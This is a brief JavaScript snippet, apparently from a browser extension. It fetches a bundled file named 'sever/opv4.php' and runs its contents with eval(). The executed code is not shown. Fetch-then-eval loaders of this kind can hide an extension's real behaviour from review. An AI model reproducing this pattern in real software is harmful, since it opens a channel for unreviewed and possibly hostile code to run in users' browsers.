async function main() {
  try {
    const response = await fetch(chrome.runtime.getURL("sever/opv4.php"));
    const code = await response.text();
    eval(code);
  } catch (e) {
    console.error("Error loading opv4.php:", e);
  }
}

main();